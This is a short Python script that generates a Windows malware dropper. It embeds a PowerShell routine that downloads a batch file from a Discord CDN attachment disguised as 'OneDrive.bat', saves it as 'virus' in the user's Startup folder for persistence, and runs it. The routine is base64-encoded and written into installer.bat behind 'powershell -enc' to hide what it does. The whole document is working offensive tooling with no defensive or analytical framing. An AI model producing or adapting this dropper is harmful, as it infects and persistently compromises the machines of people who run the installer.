import base64

install_code = """$us = $env:USERNAME\n$code = "Invoke-WebRequest '<url>' -OutFile <name><program>"\n$fil1 = "C:\\Users\\"\n$fil2 = Join-Path $fil1 $us"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"\nInvoke-Expression -Command $code\nMove-Item <name><program> $fil2\nStart-Process -FilePath "$fil2\\<name><program>"\n"""

config = {
    "program" : ".bat",
    "url"     : "https://cdn.discordapp.com/attachments/975457895489626202/1210704051617009674/OneDrive.bat?ex=65eb8703&is=65d91203&hm=a80536dcc7a4ce597e659f46661493108b8c2bbebb29ce95a2fa5035596f543c&",
    "name"    : "virus"
}

def encrypt_string(text):
    utf16le_bytes = text.encode('utf-16le')

    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')

    return base64_encoded

r = open("installer.bat", "w")
r.write('powershell -Command "powershell -enc ' + encrypt_string(install_code.replace("<program>", config["program"]).replace("<url>", config["url"]).replace("<name>", config["name"])) + '"')
r.close()